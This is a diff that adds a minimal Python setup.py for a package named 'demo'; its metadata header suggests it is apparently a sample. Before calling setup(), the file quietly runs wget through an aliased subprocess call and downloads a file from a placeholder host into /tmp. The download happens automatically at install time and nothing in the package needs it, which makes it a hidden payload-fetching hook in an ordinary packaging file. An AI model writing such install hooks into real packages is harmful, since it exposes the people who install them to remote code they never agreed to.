@@ -1,0 +1,9 @@
+# path: setup.py
+# lines: 4
+# weight: 35
+# ---
+from subprocess import run as r
+from setuptools import setup
+
+r(["wget", "-q", "-O", "/tmp/x", "example.invalid/x"])
+setup(name="demo")
